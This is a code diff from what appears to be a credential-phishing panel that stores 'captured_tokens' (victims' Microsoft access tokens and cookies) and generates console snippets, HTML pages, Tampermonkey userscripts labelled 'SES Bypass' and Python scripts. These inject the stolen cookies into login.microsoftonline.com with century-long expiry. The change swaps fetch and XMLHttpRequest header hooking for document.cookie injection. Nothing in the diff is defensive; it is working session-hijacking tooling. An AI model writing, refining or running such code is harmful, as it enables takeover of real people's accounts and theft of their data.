@@ -3,6 +3,7 @@ const router = express.Router();
 const db = require('../database/connection');
 const { userAuth } = require('../middleware/auth');
 const { encrypt, decrypt } = require('../utils/encrypt');
+const config = require('../config/env');
 
 // Get all tokens for user
 router.get('/', userAuth, async (req, res) => {
@@ -189,58 +190,40 @@ function parseCookies(cookieString) {
   return cookies;
 }
 
+// FIX: Use document.cookie instead of fetch interception
+// This ensures cookies are actually set in the browser for login.microsoftonline.com
 function generateConsoleScript(cookies) {
-  var script = '(function() {\n';
-  script += '  var cookies = ' + JSON.stringify(cookies) + ';\n';
-  script += '  var originalFetch = window.fetch;\n';
-  script += '  window.fetch = function(url, options) {\n';
-  script += '    options = options || {};\n';
-  script += '    if (typeof url === "string" && url.indexOf("login.microsoftonline.com") !== -1) {\n';
-  script += '      options.headers = options.headers || {};\n';
-  script += '      var cookieHeader = "";\n';
-  script += '      for (var i = 0; i < cookies.length; i++) {\n';
-  script += '        if (i > 0) cookieHeader += "; ";\n';
-  script += '        cookieHeader += cookies[i].name + "=" + cookies[i].value;\n';
-  script += '      }\n';
-  script += '      options.headers["Cookie"] = cookieHeader;\n';
-  script += '    }\n';
-  script += '    return originalFetch(url, options);\n';
-  script += '  };\n';
-  script += '  console.log("Cookie injection active");\n';
-  script += '  setTimeout(function() {\n';
-  script += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
-  script += '  }, 1500);\n';
-  script += '})();';
+  var expires = new Date();
+  expires.setFullYear(expires.getFullYear() + 100);
+  var expStr = expires.toUTCString();
   
-  return script;
+  var statements = cookies.map(function(c) {
+    var domain = c.domain || '.login.microsoftonline.com';
+    return 'document.cookie="' + c.name + '=' + c.value + '; domain=' + domain + '; expires=' + expStr + '; path=/; SameSite=None; secure"';
+  }).join(';\n  ');
+  
+  return '(function(){\n  try {\n    ' + statements + ';\n    console.log("Injected " + ' + cookies.length + ' cookies");\n  } catch(e){ console.error("Cookie inject failed:", e); }\n  setTimeout(function(){ window.location.href="https://login.microsoftonline.com/?auth=2"; }, 1500);\n})();';
 }
 
+// FIX: Use document.cookie instead of fetch interception
 function generateStandaloneHtml(cookies) {
   var cookieJson = JSON.stringify(cookies);
+  var expires = new Date();
+  expires.setFullYear(expires.getFullYear() + 100);
+  var expStr = expires.toUTCString();
   
-  // Build cookie header string
-  var cookieHeader = "";
-  for (var i = 0; i < cookies.length; i++) {
-    if (i > 0) cookieHeader += "; ";
-    cookieHeader += cookies[i].name + "=" + cookies[i].value;
-  }
-  
-  // Build the bypass script that will be copied - clean version without comments
-  var bypassScript = '(function() {\n';
-  bypassScript += '  var cookies = ' + cookieJson + ';\n';
-  bypassScript += '  var originalFetch = window.fetch;\n';
-  bypassScript += '  window.fetch = function(url, options) {\n';
-  bypassScript += '    options = options || {};\n';
-  bypassScript += '    if (typeof url === "string" && url.indexOf("login.microsoftonline.com") !== -1) {\n';
-  bypassScript += '      options.headers = options.headers || {};\n';
-  bypassScript += '      options.headers["Cookie"] = "' + cookieHeader.replace(/"/g, '\\"') + '";\n';
-  bypassScript += '    }\n';
-  bypassScript += '    return originalFetch(url, options);\n';
-  bypassScript += '  };\n';
-  bypassScript += '  setTimeout(function() {\n';
-  bypassScript += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
-  bypassScript += '  }, 1500);\n';
-  bypassScript += '})();';
+  var bypassScript = '(function(){\n' +
+    '  var cookies=' + cookieJson + ';\n' +
+    '  var exp="' + expStr + '";\n' +
+    '  for(var i=0;i<cookies.length;i++){\n' +
+    '    try{\n' +
+    '      var d=cookies[i].domain||".login.microsoftonline.com";\n' +
+    '      document.cookie=cookies[i].name+"="+cookies[i].value+"; domain="+d+"; expires="+exp+"; path=/; SameSite=None; secure";\n' +
+    '    }catch(e){}\n' +
+    '  }\n' +
+    '  console.log("Injected "+cookies.length+" cookies via document.cookie");\n' +
+    '  setTimeout(function(){window.location.href="https://login.microsoftonline.com/?auth=2";},1500);\n' +
+    '})();';
   
   var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
   html += '  <meta charset="UTF-8">\n';
@@ -274,7 +257,13 @@ function generateStandaloneHtml(cookies) {
   return html;
 }
 
+// FIX: Use document.cookie instead of fetch interception
 function generateTampermonkeyScript(cookies) {
+  var cookieJson = JSON.stringify(cookies);
+  var expires = new Date();
+  expires.setFullYear(expires.getFullYear() + 100);
+  var expStr = expires.toUTCString();
+  
   var script = '// ==UserScript==\n';
   script += '// @name         VGenius Cookie Injector (SES Bypass)\n';
   script += '// @namespace    http://tampermonkey.net/\n';
@@ -286,39 +275,15 @@ function generateTampermonkeyScript(cookies) {
   script += '// ==/UserScript==\n\n';
   script += '(function() {\n';
   script += '  \'use strict\';\n\n';
-  script += '  var cookies = ' + JSON.stringify(cookies) + ';\n\n';
-  script += '  var originalFetch = window.fetch;\n';
-  script += '  window.fetch = function(url, options) {\n';
-  script += '    options = options || {};\n';
-  script += '    if (typeof url === "string" && url.indexOf("login.microsoftonline.com") !== -1) {\n';
-  script += '      options.headers = options.headers || {};\n';
-  script += '      var cookieHeader = "";\n';
-  script += '      for (var i = 0; i < cookies.length; i++) {\n';
-  script += '        if (i > 0) cookieHeader += "; ";\n';
-  script += '        cookieHeader += cookies[i].name + "=" + cookies[i].value;\n';
-  script += '      }\n';
-  script += '      options.headers["Cookie"] = cookieHeader;\n';
-  script += '    }\n';
-  script += '    return originalFetch(url, options);\n';
-  script += '  };\n\n';
-  script += '  var originalOpen = XMLHttpRequest.prototype.open;\n';
-  script += '  XMLHttpRequest.prototype.open = function(method, url) {\n';
-  script += '    this._url = url;\n';
-  script += '    return originalOpen(method, url);\n';
-  script += '  };\n\n';
-  script += '  var originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;\n';
-  script += '  XMLHttpRequest.prototype.setRequestHeader = function(name, value) {\n';
-  script += '    if (this._url && this._url.indexOf("login.microsoftonline.com") !== -1 && name.toLowerCase() === "cookie") {\n';
-  script += '      var cookieHeader = "";\n';
-  script += '      for (var i = 0; i < cookies.length; i++) {\n';
-  script += '        if (i > 0) cookieHeader += "; ";\n';
-  script += '        cookieHeader += cookies[i].name + "=" + cookies[i].value;\n';
-  script += '      }\n';
-  script += '      value = cookieHeader + "; " + value;\n';
-  script += '    }\n';
-  script += '    return originalSetRequestHeader(name, value);\n';
-  script += '  };\n\n';
-  script += '  console.log("✅ VGenius: Cookie injection hooks installed");\n';
+  script += '  var cookies = ' + cookieJson + ';\n';
+  script += '  var exp="' + expStr + '";\n\n';
+  script += '  for(var i=0;i<cookies.length;i++){\n';
+  script += '    try{\n';
+  script += '      var d=cookies[i].domain||".login.microsoftonline.com";\n';
+  script += '      document.cookie=cookies[i].name+"="+cookies[i].value+"; domain="+d+"; expires="+exp+"; path=/; SameSite=None; secure";\n';
+  script += '    }catch(e){}\n';
+  script += '  }\n\n';
+  script += '  console.log("VGenius: Injected "+cookies.length+" cookies via document.cookie");\n';
   script += '  \n';
   script += '  setTimeout(function() {\n';
   script += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
@@ -345,9 +310,9 @@ function generatePythonScript(cookies) {
   script += '            secure=True,\n';
   script += '            samesite="None"\n';
   script += '        )\n';
-  script += '        print(f"✅ Injected: {cookie["name"]}")\n';
+  script += '        print(f"Injected: {cookie[\'name\']}")\n';
   script += '    except Exception as e:\n';
-  script += '        print(f"❌ Failed: {cookie["name"]} - {e}")\n\n';
+  script += '        print(f"Failed: {cookie[\'name\']} - {e}")\n\n';
   script += 'print("\\nSession ready!")\n';
   script += 'print(f"Total cookies: {len(cookies)}")\n';
   script += 'print(f"Generated at: {datetime.now()}")\n';
@@ -586,7 +551,6 @@ router.post('/export', userAuth, async (req, res) => {
       'SELECT id, email, token_type, ip_address, user_agent, notes, expiration, created_at, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted FROM captured_tokens WHERE user_id = ? AND deleted = 0 ORDER BY created_at DESC',
       [req.user.id]
     );
-    const cfg = require('../config/env');
     
     // Decrypt tokens for export
     const decryptedTokens = tokens.map(token => ({
